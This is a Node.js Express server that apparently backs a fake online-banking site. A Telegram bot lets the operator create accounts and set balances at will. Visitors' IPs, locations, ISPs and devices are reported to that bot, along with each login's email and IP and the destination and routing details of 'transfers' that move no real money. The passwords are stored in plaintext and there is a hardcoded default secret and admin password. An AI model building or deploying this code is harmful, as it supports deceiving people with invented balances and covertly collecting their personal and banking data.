import express from 'express';
import cors from 'cors';
import sqlite3 from 'sqlite3';
import { open } from 'sqlite';
import TelegramBot from 'node-telegram-bot-api';
import axios from 'axios';
import dotenv from 'dotenv';
import useragent from 'express-useragent';
import requestIp from 'request-ip';
import jwt from 'jsonwebtoken';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(express.json());
app.use(useragent.express());
app.use(requestIp.mw());

const PORT = 80;
const JWT_SECRET = process.env.JWT_SECRET || 'nexus_super_secret_key';

// Telegram Bot
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID;

let bot = null;
if (token && token.length > 5) {
    bot = new TelegramBot(token, { polling: true });
    console.log("Telegram Bot Initialized");
} else {
    console.warn("WARNING: TELEGRAM_BOT_TOKEN not provided in .env");
}

let db;

async function setupDatabase() {
    db = await open({
        filename: './database.sqlite',
        driver: sqlite3.Database
    });

    await db.exec(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE,
            password TEXT,
            balance REAL DEFAULT 0,
            status TEXT DEFAULT 'active'
        );
        
        CREATE TABLE IF NOT EXISTS visits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            country TEXT,
            city TEXT,
            device TEXT,
            browser TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        );
    `);
    
    // Create admin if not exists
    const admin = await db.get('SELECT * FROM users WHERE email = ?', ['admin@nexus.com']);
    if (!admin) {
        await db.run('INSERT INTO users (email, password, balance) VALUES (?, ?, ?)', ['admin@nexus.com', 'admin123', 50000]);
    }
}

// ---------------------------------------------------------
// TELEGRAM BOT COMMANDS
// ---------------------------------------------------------
if (bot) {
    bot.onText(/\/start/, (msg) => {
        if (adminChatId && msg.chat.id.toString() !== adminChatId) {
            return bot.sendMessage(msg.chat.id, "Unauthorized. Your Chat ID is: " + msg.chat.id);
        }
        const welcomeText = `
🛡️ *Nexus Admin System Online*
I am tracking all visits and logins.

*Commands:*
/users - List active accounts
/adduser [email] [pass] [bal] - Create account
/deluser [email] - Delete account
/setbalance [email] [bal] - Update balance
`;
        bot.sendMessage(msg.chat.id, welcomeText, { parse_mode: "Markdown" });
    });

    bot.onText(/\/users/, async (msg) => {
        if (adminChatId && msg.chat.id.toString() !== adminChatId) return;
        const users = await db.all('SELECT email, balance FROM users');
        let text = "👥 *Users List:*\n\n";
        users.forEach(u => text += `- ${u.email} ($${u.balance})\n`);
        bot.sendMessage(msg.chat.id, text, { parse_mode: "Markdown" });
    });

    bot.onText(/\/adduser (.+) (.+) (.+)/, async (msg, match) => {
        if (adminChatId && msg.chat.id.toString() !== adminChatId) return;
        const [_, email, password, balance] = match;
        try {
            await db.run('INSERT INTO users (email, password, balance) VALUES (?, ?, ?)', [email, password, parseFloat(balance)]);
            bot.sendMessage(msg.chat.id, `✅ User *${email}* created with $${balance}`, { parse_mode: "Markdown" });
        } catch (e) {
            bot.sendMessage(msg.chat.id, `❌ Error: ${e.message}`);
        }
    });

    bot.onText(/\/deluser (.+)/, async (msg, match) => {
        if (adminChatId && msg.chat.id.toString() !== adminChatId) return;
        const [_, email] = match;
        await db.run('DELETE FROM users WHERE email = ?', [email]);
        bot.sendMessage(msg.chat.id, `🗑️ User *${email}* deleted.`, { parse_mode: "Markdown" });
    });

    bot.onText(/\/setbalance (.+) (.+)/, async (msg, match) => {
        if (adminChatId && msg.chat.id.toString() !== adminChatId) return;
        const [_, email, balance] = match;
        await db.run('UPDATE users SET balance = ? WHERE email = ?', [parseFloat(balance), email]);
        bot.sendMessage(msg.chat.id, `💰 Balance for *${email}* updated to $${balance}`, { parse_mode: "Markdown" });
    });
}

// ---------------------------------------------------------
// TRACKING MIDDLEWARE
// ---------------------------------------------------------
app.use((req, res, next) => {
    // GUARANTEE INSTANT WEBSITE LOADING
    next();

    // Do the heavy geolocation completely in the background
    if (req.method === 'GET' && !req.path.startsWith('/api') && !req.path.includes('.')) {
        const ip = req.clientIp;
        if (ip && ip !== '::1' && ip !== '127.0.0.1') {
            (async () => {
                try {
                    const recent = await db.get('SELECT * FROM visits WHERE ip = ? AND timestamp > datetime("now", "-10 minutes")', [ip]);
                    if (!recent) {
                        let geo = { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
                        try {
                            const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 3000 });
                            if (response.data.status === 'success') {
                                geo.country = response.data.country;
                                geo.city = response.data.city;
                                geo.isp = response.data.isp;
                            }
                        } catch (e) {}
                        
                        const device = req.useragent.isMobile ? 'Mobile' : 'Desktop';
                        const browser = req.useragent.browser;
                        const os = req.useragent.os;
                        
                        await db.run('INSERT INTO visits (ip, country, city, device, browser) VALUES (?, ?, ?, ?, ?)', [ip, geo.country, geo.city, device, browser]);
                        
                        if (bot && adminChatId) {
                            const text = `🚨 *New Visit Detected!*\n\n🌍 *Location*: ${geo.city}, ${geo.country}\n🏢 *ISP*: ${geo.isp}\n💻 *IP*: ${ip}\n📱 *Device*: ${device} (${browser} on ${os})`;
                            bot.sendMessage(adminChatId, text, { parse_mode: "Markdown" }).catch(() => {});
                        }
                    }
                } catch (err) {
                    console.error("Tracking error:", err.message);
                }
            })();
        }
    }
});

// ---------------------------------------------------------
// API ROUTES
// ---------------------------------------------------------

app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    const user = await db.get('SELECT * FROM users WHERE email = ? AND password = ?', [email, password]);
    if (user) {
        if (user.status !== 'active') return res.status(401).json({ error: 'Account frozen' });
        const token = jwt.sign({ id: user.id, email: user.email }, JWT_SECRET);
        res.json({ token, user: { id: user.id, email: user.email, balance: user.balance } });
        
        if (bot && adminChatId) {
            bot.sendMessage(adminChatId, `🔐 *User Logged In*\nEmail: ${email}\nIP: ${req.clientIp}`, { parse_mode: "Markdown" });
        }
    } else {
        res.status(401).json({ error: 'Invalid credentials' });
    }
});

// Middleware to authenticate JWT
const auth = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token' });
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
    } catch {
        res.status(401).json({ error: 'Invalid token' });
    }
};

app.get('/api/user', auth, async (req, res) => {
    const user = await db.get('SELECT id, email, balance, status FROM users WHERE id = ?', [req.user.id]);
    res.json(user);
});

app.post('/api/transfer', auth, async (req, res) => {
    const { amount, destination, routingNumber } = req.body;
    const user = await db.get('SELECT * FROM users WHERE id = ?', [req.user.id]);
    
    if (user.balance < amount) return res.status(400).json({ error: 'Insufficient funds' });
    
    await db.run('UPDATE users SET balance = balance - ? WHERE id = ?', [amount, user.id]);
    
    res.json({ success: true, newBalance: user.balance - amount });
    
    if (bot && adminChatId) {
        const routeText = routingNumber ? `\nRouting: ${routingNumber}` : '';
        bot.sendMessage(adminChatId, `💸 *Transfer Alert*\nUser: ${user.email}\nSent: $${amount}\nTo: ${destination}${routeText}`, { parse_mode: "Markdown" });
    }
});

// ---------------------------------------------------------
// SERVE REACT APP
// ---------------------------------------------------------
app.use(express.static(path.join(__dirname, 'dist')));
app.get('*', (req, res) => {
    const distPath = path.join(__dirname, 'dist', 'index.html');
    if (fs.existsSync(distPath)) {
        res.sendFile(distPath);
    } else {
        res.status(404).send("React App not built yet. Need to run 'npm run build'");
    }
});

// Start Server
setupDatabase().then(() => {
    app.listen(PORT, () => {
        console.log(`Backend and Frontend running natively on port ${PORT}`);
    });
});
